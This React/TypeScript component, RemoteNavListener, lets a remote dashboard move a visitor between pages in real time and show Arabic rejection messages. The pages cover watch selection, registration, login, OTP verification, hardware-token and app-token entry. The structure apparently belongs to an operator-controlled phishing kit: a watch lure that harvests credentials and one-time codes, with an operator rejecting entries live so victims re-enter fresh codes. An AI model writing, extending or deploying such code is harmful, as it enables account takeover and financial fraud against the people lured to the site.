import { useEffect, useRef } from "react";
import { useLocation, useNavigate } from "@tanstack/react-router";

import { getRemoteStage } from "@/lib/tracking.functions";
import { getSessionId } from "@/lib/session-id";
import { subscribeRemoteReject, subscribeRemoteStage } from "@/lib/realtime";
import { toast } from "sonner";

const CUSTOMER_PATHS = new Set([
  "/",
  "/select-watch",
  "/register",
  "/login",
  "/verify-otp",
  "/hardware-token",
  "/app-token",
  "/processing",
]);

const STAGE_TO_PATH: Record<string, string> = {
  "select-watch": "/select-watch",
  register: "/register",
  login: "/login",
  "verify-otp": "/verify-otp",
  "hardware-token": "/hardware-token",
  "app-token": "/app-token",
  processing: "/processing",
};

/** رسالة الخطأ حسب الصفحة التي تم الرفض منها */
const REJECT_MESSAGE: Record<string, { title: string; description: string }> = {
  "/register": {
    title: "تعذّر قبول بياناتك",
    description: "البيانات المُدخلة غير مطابقة. يرجى مراجعة الاسم ورقم الهاتف والمدينة ثم إعادة الإرسال.",
  },
  "/login": {
    title: "بيانات الدخول غير صحيحة",
    description: "لم نتمكن من التحقق من رقم المستخدم أو كلمة المرور. أعد المحاولة ببيانات صحيحة.",
  },
  "/verify-otp": {
    title: "رمز التحقق غير صحيح",
    description: "انتهت صلاحية الرمز أو تم إدخاله بشكل خاطئ. اطلب رمزاً جديداً وأدخله خلال المدة المحددة.",
  },
  "/hardware-token": {
    title: "توكن الجهاز مرفوض",
    description: "الرمز الظاهر على جهازك غير مطابق. تأكد من قراءته بشكل صحيح وأعد إدخاله.",
  },
  "/app-token": {
    title: "توكن التطبيق مرفوض",
    description: "رمز التطبيق غير صالح. افتح التطبيق واحصل على رمز جديد ثم أعد الإدخال.",
  },
  "/processing": {
    title: "تعذّر إكمال الطلب",
    description: "لم يتم اعتماد طلبك حالياً. سيتم التواصل معك أو يمكنك إعادة المحاولة لاحقاً.",
  },
  "/select-watch": {
    title: "الساعة غير متاحة",
    description: "الموديل المختار غير متوفر حالياً. يرجى اختيار موديل آخر.",
  },
};

const DEFAULT_REJECT = {
  title: "تم رفض العملية",
  description: "حدث خطأ أثناء معالجة طلبك. يرجى إعادة المحاولة.",
};

export function RemoteNavListener() {
  const { pathname } = useLocation();
  const navigate = useNavigate();
  const lastStage = useRef<string | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (!CUSTOMER_PATHS.has(pathname)) return;

    const sid = getSessionId();
    let cancelled = false;

    function apply(stage: string) {
      if (cancelled) return;
      const target = STAGE_TO_PATH[stage];
      if (target && target !== pathname && lastStage.current !== stage) {
        lastStage.current = stage;
        void navigate({ to: target });
      }
    }

    // One-shot fetch to sync the current stage on mount / route change
    void getRemoteStage({ data: { sessionId: sid } })
      .then((res) => res?.stage && apply(res.stage))
      .catch(() => {});

    // Live push from the dashboard via WebSocket
    const unsub = subscribeRemoteStage(sid, apply);

    // رسائل الرفض: تُعرض حسب الصفحة الحالية للمستخدم
    const unsubReject = subscribeRemoteReject(sid, () => {
      if (cancelled) return;
      const msg = REJECT_MESSAGE[pathname] ?? DEFAULT_REJECT;
      toast.error(msg.title, { description: msg.description, duration: 8000 });
    });

    return () => {
      cancelled = true;
      unsub();
      unsubReject();
    };
  }, [pathname, navigate]);

  return null;
}
